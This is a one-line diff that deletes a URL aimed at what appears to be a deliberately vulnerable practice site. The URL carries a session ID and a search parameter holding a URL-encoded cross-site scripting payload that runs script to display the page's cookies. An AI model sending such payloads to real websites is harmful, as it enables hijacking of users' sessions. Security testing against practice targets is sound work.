@@ -1,1 +1,0 @@
-https://54-183-129-30-shred.vulnerablesites.net/Shred/searh.action;jsessionid=DDD52663B7A6449FE57689E7BB5B383B?searchTerm=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
